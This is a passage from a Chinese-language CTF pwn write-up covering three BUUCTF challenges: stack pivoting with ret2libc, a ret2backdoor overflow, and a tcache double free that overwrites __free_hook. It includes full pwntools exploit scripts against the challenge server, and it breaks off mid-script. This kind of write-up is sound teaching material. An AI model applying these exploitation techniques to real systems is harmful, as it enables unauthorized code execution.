keyword">char</span> s<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-10h] BYREF</span>  <span class="token function">fgets</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  len <span class="token operator">=</span> <span class="token function">atol</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>但是读取的内容还是存在<code>0x8</code>字节的溢出，也就刚好可以返回到一个地址，溢出长度不够，所以可以想到使用栈迁移，先将需要执行的内容写到栈上再把程序流直接劫持到栈上，这里可以使用<code>ret2libc</code>，但直接返回到<code>main</code>或<code>start</code>故技重施却不能正常输入，于是想到在第一次输入就控制执行<code>read</code>填写到指定地址再次利用栈迁移执行到指定地址，但是这个地址不能是原栈地址或向后一部分的地址，所以需要考虑找一个可写的地址</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pwndbg<span class="token operator">></span> vmmapLEGEND: STACK <span class="token operator">|</span> HEAP <span class="token operator">|</span> CODE <span class="token operator">|</span> DATA <span class="token operator">|</span> RWX <span class="token operator">|</span> RODATA             Start                End Perm     Size Offset File          0x3fe000           0x400000 rw-p     <span class="token number">2000</span>      <span class="token number">0</span> /home/starrysky/buuctf/actf_2019_babystack/pwn          0x400000           0x401000 r-xp     <span class="token number">1000</span>   <span class="token number">2000</span> /home/starrysky/buuctf/actf_2019_babystack/pwn          0x600000           0x601000 r--p     <span class="token number">1000</span>   <span class="token number">2000</span> /home/starrysky/buuctf/actf_2019_babystack/pwn          0x601000           0x602000 rw-p     <span class="token number">1000</span>   <span class="token number">3000</span> /home/starrysky/buuctf/actf_2019_babystack/pwn    0x7ffff79e4000     0x7ffff7bcb000 r-xp   1e7000      <span class="token number">0</span> /home/starrysky/buuctf/actf_2019_babystack/2.27/libc-2.27.so    0x7ffff7bcb000     0x7ffff7dcb000 ---p   <span class="token number">200000</span> 1e7000 /home/starrysky/buuctf/actf_2019_babystack/2.27/libc-2.27.so    0x7ffff7dcb000     0x7ffff7dcf000 r--p     <span class="token number">4000</span> 1e7000 /home/starrysky/buuctf/actf_2019_babystack/2.27/libc-2.27.so    0x7ffff7dcf000     0x7ffff7dd1000 rw-p     <span class="token number">2000</span> 1eb000 /home/starrysky/buuctf/actf_2019_babystack/2.27/libc-2.27.so    0x7ffff7dd1000     0x7ffff7dd5000 rw-p     <span class="token number">4000</span>      <span class="token number">0</span> <span class="token punctuation">[</span>anon_7ffff7dd1<span class="token punctuation">]</span>    0x7ffff7dd5000     0x7ffff7dfc000 r-xp    <span class="token number">27000</span>      <span class="token number">0</span> /home/starrysky/buuctf/actf_2019_babystack/2.27/ld-2.27.so    0x7ffff7ff4000     0x7ffff7ff6000 rw-p     <span class="token number">2000</span>      <span class="token number">0</span> <span class="token punctuation">[</span>anon_7ffff7ff4<span class="token punctuation">]</span>    0x7ffff7ff6000     0x7ffff7ffa000 r--p     <span class="token number">4000</span>      <span class="token number">0</span> <span class="token punctuation">[</span>vvar<span class="token punctuation">]</span>    0x7ffff7ffa000     0x7ffff7ffc000 r-xp     <span class="token number">2000</span>      <span class="token number">0</span> <span class="token punctuation">[</span>vdso<span class="token punctuation">]</span>    0x7ffff7ffc000     0x7ffff7ffd000 r--p     <span class="token number">1000</span>  <span class="token number">27000</span> /home/starrysky/buuctf/actf_2019_babystack/2.27/ld-2.27.so    0x7ffff7ffd000     0x7ffff7ffe000 rw-p     <span class="token number">1000</span>  <span class="token number">28000</span> /home/starrysky/buuctf/actf_2019_babystack/2.27/ld-2.27.so    0x7ffff7ffe000     0x7ffff7fff000 rw-p     <span class="token number">1000</span>      <span class="token number">0</span> <span class="token punctuation">[</span>anon_7ffff7ffe<span class="token punctuation">]</span>    0x7ffffffde000     0x7ffffffff000 rw-p    <span class="token number">21000</span>      <span class="token number">0</span> <span class="token punctuation">[</span>stack<span class="token punctuation">]</span>0xffffffffff600000 0xffffffffff601000 <span class="token parameter variable">--xp</span>     <span class="token number">1000</span>      <span class="token number">0</span> <span class="token punctuation">[</span>vsyscall<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>由于没有开地址随机化，以上地址中可以采用<code>0x601000           0x602000 rw-p     1000   3000 /home/starrysky/buuctf/actf_2019_babystack/pwn</code>这一段地址区域，综上在第一次写入的内容一共有：<code>puts</code>输出<code>libc</code>地址+<code>read</code>输入下一次需要控制的内容+两次迁移</p><p>具体exp如下</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span><span class="token comment">#context.terminal = ['tmux','splitw','-h']</span>debug <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span> <span class="token number">26094</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'How many bytes of your message?'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">224</span><span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'0x'</span><span class="token punctuation">)</span>addr <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>main <span class="token operator">=</span> <span class="token number">0x400800</span>ret <span class="token operator">=</span> <span class="token number">0x0000000000400709</span>puts_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>puts_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>read <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span>pop_rsi_r15_ret <span class="token operator">=</span> <span class="token number">0x0000000000400ad1</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./2.27/libc-2.27.so'</span><span class="token punctuation">)</span>pop_rdi_ret <span class="token operator">=</span> <span class="token number">0x0000000000400ad3</span>pop_rbp_ret <span class="token operator">=</span> <span class="token number">0x0000000000400860</span>leave_ret <span class="token operator">=</span> <span class="token number">0x0000000000400a18</span>p <span class="token operator">=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span>p <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rsi_r15_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>read<span class="token punctuation">)</span>p <span class="token operator">+=</span> p64<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span>p <span class="token operator">=</span> p<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0xd0</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>addr <span class="token operator">-</span> <span class="token number">0x8</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>leave_ret<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'What is the content of your message?'</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>puts_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> puts_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>one <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x4f2c5</span><span class="token punctuation">,</span> <span class="token number">0x4f322</span><span class="token punctuation">,</span> <span class="token number">0x10a38c</span><span class="token punctuation">]</span>ogg <span class="token operator">=</span> one<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_basesleep<span class="token punctuation">(</span><span class="token number">0.5</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p64<span class="token punctuation">(</span>ogg<span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="suctf-2018-basic-pwn"><a href="#suctf-2018-basic-pwn" class="headerlink" title="suctf_2018_basic pwn"></a><a href="https://buuoj.cn/challenges#suctf_2018_basic%20pwn">suctf_2018_basic pwn</a></h2><p>一道栈题，先检查保护</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">suctf_2018_basic  checksec pwn       <span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/starrysky/buuctf/suctf_2018_basic/pwn'</span>    Arch:     amd64-64-little    RELRO:    Full RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE <span class="token punctuation">(</span>0x3fe000<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>查看程序，很简单的一个栈溢出</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">char</span> s<span class="token punctuation">[</span><span class="token number">268</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+10h] [rbp-110h] BYREF</span>  <span class="token keyword">int</span> v5<span class="token punctuation">;</span> <span class="token comment">// [rsp+11Ch] [rbp-4h]</span>  <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> s<span class="token punctuation">)</span><span class="token punctuation">;</span>  v5 <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Hi %s\n"</span><span class="token punctuation">,</span> s<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>存在后门函数</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">callThisFun</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">char</span> <span class="token operator">*</span>path<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-20h] BYREF</span>  path<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"/bin/cat"</span><span class="token punctuation">;</span>  path<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"flag.txt"</span><span class="token punctuation">;</span>  path<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">execve</span><span class="token punctuation">(</span><span class="token string">"/bin/cat"</span><span class="token punctuation">,</span> path<span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>按照惯例来说，远程文件名应该是不对的，但是还是尝试一下直接返回到后门尝试一下</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Switching to interactive mode$ <span class="token function">cat</span> flag<span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Sent 0x9 bytes:    b<span class="token string">'cat flag\n'</span><span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Received 0x2b bytes:    b<span class="token string">'flag&#123;e89f200e-b1f5-4bab-972d-c7ce0425b67a&#125;\n'</span>flag<span class="token punctuation">&#123;</span>e89f200e-b1f5-4bab-972d-c7ce0425b67a<span class="token punctuation">&#125;</span><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Got EOF <span class="token keyword">while</span> reading <span class="token keyword">in</span> interactive$ <span class="token punctuation">[</span>*<span class="token punctuation">]</span> Interrupted<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Closed connection to node4.buuoj.cn port <span class="token number">28894</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>嗯…结果对了，exp如下</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span><span class="token comment">#context.terminal = ['tmux','splitw','-h']</span>debug <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span> <span class="token number">28894</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>backdoor <span class="token operator">=</span> <span class="token number">0x401157</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x118</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>backdoor<span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="ciscn-2019-es-1"><a href="#ciscn-2019-es-1" class="headerlink" title="ciscn_2019_es_1"></a><a href="https://buuoj.cn/challenges#ciscn_2019_es_1">ciscn_2019_es_1</a></h2><p>这是一道堆题，检查保护发现保护全开，逆程序找漏洞</p><p><code>add</code>函数限制了最多创建12个堆，输入指定长度的<code>name</code>和电话号码，但实际上也没有要求是数字</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">heap_addr[index] &#x3D; malloc(0x18uLL);  puts(&quot;Please input the size of compary&#39;s name&quot;);  __isoc99_scanf(&quot;%d&quot;, size);  heap_addr[heap_number]-&gt;name_size &#x3D; size[0];  heap_ptr &#x3D; heap_addr[heap_number];  heap_ptr-&gt;name_ptr &#x3D; malloc(LODWORD(size[0]));  puts(&quot;please input name:&quot;);  read(0, heap_addr[heap_number]-&gt;name_ptr, LODWORD(size[0]));  puts(&quot;please input compary call:&quot;);  read(0, &amp;heap_addr[heap_number]-&gt;ring, 0xCuLL);  HIBYTE(heap_addr[heap_number][1].name_ptr) &#x3D; 0;  puts(&quot;Done!&quot;);  ++heap_number;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>delete</code>函数存在<code>UAF</code>漏洞</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">unsigned</span> __int64 <span class="token function">delete</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> v1<span class="token punctuation">;</span> <span class="token comment">// [rsp+4h] [rbp-Ch] BYREF</span>  <span class="token keyword">unsigned</span> __int64 v2<span class="token punctuation">;</span> <span class="token comment">// [rsp+8h] [rbp-8h]</span>  v2 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Please input the index:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v1<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> heap_addr<span class="token punctuation">[</span>v1<span class="token punctuation">]</span> <span class="token punctuation">)</span>    <span class="token function">free</span><span class="token punctuation">(</span><span class="token operator">*</span>heap_addr<span class="token punctuation">[</span>v1<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//vuln</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"You try it!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Done"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v2<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>show</code>函数可以输出<code>name</code>和电话号码，基本就是用于输出<code>libc</code>的</p><p>第一步就是输出<code>libc</code>， 由于版本是<code>2.27</code>存在<code>tcache</code>，所以要先填充<code>tcache</code>再通过<code>unsorted bin</code>获取<code>libc</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>add<span class="token punctuation">(</span><span class="token number">0x90</span><span class="token punctuation">,</span> <span class="token string">b'b'</span><span class="token punctuation">,</span> <span class="token string">b'd'</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>delete<span class="token punctuation">(</span>i<span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>接下来就是考虑如何任意地址写，一开始想的是想办法去溢出然后控制堆大小，然后发现根本没有漏洞可以溢出。然后想起来<code>double free</code>，试了一下确实可以，所以思路就是<code>double free</code>到<code>tcache</code>中，再通过<code>add</code>改<code>fd</code>为<code>__free_hook</code>，再申请出来即可实现任意地址写，但是<code>tcache</code>有一个检查，从<code>tcache</code>中取出堆之后这一行的下标不能为负数，所以可以通过三次释放同一个堆到<code>tcache</code>中的方式来增加数组下标值，此时再取出就可以通过检查了，但堆数量一定会超过。翻了翻笔记想起来<code>tcache bin</code>的大小范围在<code>0x400</code>之内，超过<code>0x400</code>直接进入<code>unsorted bin</code>，利用这一特点就不需要再去创建八个堆泄露地址了</p><p>exp如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span><span class="token comment">#context.terminal = ['tmux','splitw','-h']</span>debug <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span> <span class="token number">29084</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>name_size<span class="token punctuation">,</span> name<span class="token punctuation">,</span> phone_num<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'choice:'</span><span class="token punctuation">,</span> <span class="token string">b'1'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b"Please input the size of compary's name"</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>name_size<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'please input name:'</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'please input compary call:'</span><span class="token punctuation">,</span> phone_num<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'choice:'</span><span class="token punctuation">,</span> <span class="token string">b'2'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Please input the index:'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'choice:'</span><span class="token punctuation">,</span> <span class="token string">b'3'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Please input the index:'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x500</span><span class="token punctuation">,</span> <span class="token string">b'b'</span><span class="token punctuation">,</span> <span class="token string">b'd'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x50</span><span class="token punctuation">,</span> <span class="token string">b'b'</span><span class="token punctuation">,</span> <span class="token string">b'd'</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x3ebca0</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./2.27/libc-2.27.so'</span><span class="token punctuation">)</span>free_hook <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_baseone <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token 